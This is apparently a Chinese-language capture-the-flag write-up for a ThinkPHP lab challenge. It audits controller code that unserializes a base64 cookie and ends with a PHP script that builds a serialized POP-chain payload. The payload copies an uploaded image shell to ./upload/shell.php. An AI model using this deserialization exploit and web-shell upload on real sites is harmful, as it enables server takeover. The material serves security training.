靶场地址： http://d1d48598-8976-4846-b4cf-9b421ea4adac.node5.buuoj.cn:81/

1.**查看有没有什么很离谱的跟功能无关的，比如魔术方法，可能是我们的突破口**

2. 如果我们觉得我们只使用系统函数不能够的话，我们考虑能不能用他写给我们的函数。

## WP
首先，我们拿到我们的页面，我们发现一个注册和一个登录页面，这个时候，我们考虑去扫描一下我们的页面（反正也没有直接的思路）**尽可能的考虑去拿到我们的源码**

接下来，我们扫到了，存在 `www.tar.gz` 这一文件，存储了我们的对应的文件信息。这个时候下载这个压缩包，我们就能看见。
![[Pasted image 20240505171921.png]]

显然，这是一个 ThinkPHP 框架的文件，这个时候，我们需要**补充一点关于 THINKPHP 框架的知识**。

我们的 thinkphp 采用的是 MVC 架构模式，那么我们的 MVC 架构模式是什么呢？我们其中 `M->model,v->view,c->controler`

我们的用户输入数据时，会**直接与我们的 controler 进行交互**, controler 通过与 view 进行交互后，会把得到的数据映射到我们的 view 中，并回显给我们的用户。

![[Pasted image 20240505181133.png]]

在我们的**php**中，我们显然应该关注我们的 Controler 类，我们观察我们的 php，我们可以得到下面的代码，我们的代码审计结果如下：

注意到我们的常用方法以及对应的场景：
```
redirect->限制用户访问某个页面，如果访问量就直接返回
assign()->渲染我们的模板
fetch()->展示我们的模板
```

```php
<?php
namespace app\web\controller;  //示将当前文件中的代码置于 app\web\controller 这个命名空间下
use think\Controller; 
 
class Index extends Controller
{
    public $profile;  // 用户个人信息
    public $profile_db;  // 数据库中的用户资料
 
    public function index()
    {
        // 检查用户是否已登录
        if($this->login_check()){
            // 如果已登录，重定向到个人主页
            $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/home";
            $this->redirect($curr_url,302);
            exit();
        }
        // 如果未登录，则展示首页内容
        return $this->fetch("index");
    }
 
    public function home(){
        // 检查用户是否已登录
        if(!$this->login_check()){
            // 如果未登录，重定向到首页$curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index";
            $this->redirect($curr_url,302);  //redirect 是框架提供的一个方法，用于进行页面重定向。具体来说，它将用户重定向到指定的 URL 地址，并可以指定重定向的 HTTP 状态码，这里是302重定向到$curr_url
            exit();
        }
 
        // 检查用户是否已上传头像
        if(!$this->check_upload_img()){
            // 如果未上传头像，展示上传页面
            $this->assign("username",$this->profile_db['username']);//assign（）用于赋值
            return $this->fetch("upload");
        }else{
            // 如果已上传头像，展示个人主页
            $this->assign("img",$this->profile_db['img']);
            $this->assign("username",$this->profile_db['username']);
            return $this->fetch("home");//渲染名为 "home" 的模板，并将渲染后的结果作为响应返回
        }
    }
 
    public function login_check(){
        // 从cookie中获取用户信息
        $profile=cookie('user');
        if(!empty($profile)){
            // 解析用户信息并验证数据库中的用户资料
            $this->profile=unserialize(base64_decode($profile));
            $this->profile_db=db('user')->where("ID",intval($this->profile['ID']))->find();
            //这行代码的作用是在'user'表中，根据$this->profile['ID']的值进行条件查询,intval()将其化成整数，并将符合条件的第一条记录保存到$this->profile_db变量中。
            // 对比用户信息和数据库信息，判断用户是否已登录
            if(array_diff($this->profile_db,$this->profile)==null){
                return 1; // 已登录
            }else{
                return 0; // 未登录
            }
        }
    }
 
    public function check_upload_img(){
        // 检查用户是否已上传头像
        if(!empty($this->profile) && !empty($this->profile_db)){
            if(empty($this->profile_db['img'])){
                return 0; // 未上传头像
            }else{
                return 1; // 已上传头像
            }
        }
    }
 
    public function logout(){
        // 清除cookie中的用户信息，并重定向到首页
        cookie("user",null);
        $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index";
        $this->redirect($curr_url,302);
        exit();
    }
 
    // 魔术方法__get，当外部访问不存在的属性时返回空字符串
    public function __get($name)
    {
        return "";
    }
 
}
```

```php
<?php
// 声明命名空间
namespace app\web\controller;
// 引入 think\Controller 类
use think\Controller;
 
// 定义 Login 控制器，继承自 Controller 类
class Login extends Controller
{
    // 声明一个公共成员变量 $checker
    public $checker;
 
    // 构造函数，在创建 Login 对象时执行
    public function __construct()
    {
        // 实例化一个 Index 对象并赋值给 $this->checker
        $this->checker = new Index();
    }
 
    // 定义 login 方法，用于处理用户登录操作
    public function login()
    {
        // 如果 $this->checker 存在，则执行下面的操作
        if ($this->checker) {
            if ($this->checker->login_check()) {
                $curr_url = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "/home";
                $this->redirect($curr_url, 302);
                // 终止脚本执行
                exit();
            }
        }
 
        // 验证用户是否提交了邮箱和密码
        if (input("?post.email") && input("?post.password")) {
            // 获取用户提交的邮箱和密码
            $email = input("post.email", "", "addslashes");
            $password = input("post.password", "", "addslashes");
            // 在数据库中查找匹配邮箱的用户信息
            $user_info = db("user")->where("email", $email)->find();
            // 如果找到了用户信息
            if ($user_info) {
                if (md5($password) === $user_info['password']) {
                    $cookie_data = base64_encode(serialize($user_info));
                    cookie("user", $cookie_data, 3600);
                    $this->success('Login successful!', url('../home'));
                } else {
                    // 显示登录失败的消息，并重定向到 '../index' 路径
                    $this->error('Login failed!', url('../index'));
                }
            } else {
                // 显示邮箱未注册的消息，并重定向到 '../index' 路径
                $this->error('Email not registered!', url('../index'));
            }
        } else {
            // 显示邮箱或密码为空的消息，并重定向到 '../index' 路径
            $this->error('Email or password is null!', url('../index'));
        }
    }
}
```

1. `@copy($this->filename_tmp, $this->filename);` 这行代码调用了 PHP 的 `copy()` 函数，用于复制文件。参数 `$this->filename_tmp` 是原始文件的路径，参数 `$this->filename` 是目标文件的路径。这行代码的作用是将原始文件复制到目标文件位置。我们可以**理解为，把我们的前一个元素的值全都转移到我们的后一个元素**。
    
2. `@unlink($this->filename_tmp);` 这行代码调用了 PHP 的 `unlink()` 函数，用于删除文件。参数 `$this->filename_tmp` 是要删除的文件的路径。这行代码的作用是删除原始文件，即被复制后的临时文件。**理解为，我们把这一个元素给完全删除**。

这个时候，我们的对应的结果就是：链子为：Register 类的 checker 属性给他来个 Profile，在 Register 调用__destruct 的时候，依次调用 Profile 的 `__call->__get->upload_img`。upload_img 的第一个 if 控制属性绕过，第二个 if 不传文件就行。进入第三个 if 把事先传上去的图片马复制成 php 文件。exp 如下
```php
<?php
namespace app\web\controller;
class Register
{
    public $checker;
    public $registed=false;
    public function __construct(){
        $this->checker=new Profile();
    }
}
class Profile
{   
    public $checker=false;
    public $ext=true;
    public $filename_tmp = "./upload/cc551ab005b2e60fbdc88de809b2c4b1/249ebf7d9de9da37dff8f080629f40d3.png";
    public $filename = "./upload/shell.php";
    public $except=array('index'=>'upload_img');
}
echo urlencode(base64_encode(serialize(new Register())));
```